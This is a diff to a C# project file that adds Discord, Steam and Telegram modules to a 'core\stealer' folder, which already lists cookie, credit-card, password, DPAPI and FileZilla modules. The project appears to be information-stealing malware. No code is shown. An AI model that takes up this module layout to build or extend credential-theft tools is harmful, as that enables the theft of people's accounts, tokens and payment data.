@@ -72,12 +72,15 @@
     <Compile Include="core\stealer\Cookies.cs" />
     <Compile Include="core\stealer\CreditCards.cs" />
     <Compile Include="core\stealer\Crypt.cs" />
+    <Compile Include="core\stealer\Discord.cs" />
     <Compile Include="core\stealer\DPAPI.cs" />
     <Compile Include="core\stealer\FileZilla.cs" />
     <Compile Include="core\stealer\GrabDesktop.cs" />
     <Compile Include="core\stealer\History.cs" />
     <Compile Include="core\stealer\Passwords.cs" />
     <Compile Include="core\stealer\SQLite.cs" />
+    <Compile Include="core\stealer\Steam.cs" />
+    <Compile Include="core\stealer\Telegram.cs" />
     <Compile Include="core\telegram.cs" />
     <Compile Include="core\utils.cs" />
     <Compile Include="Program.cs" />
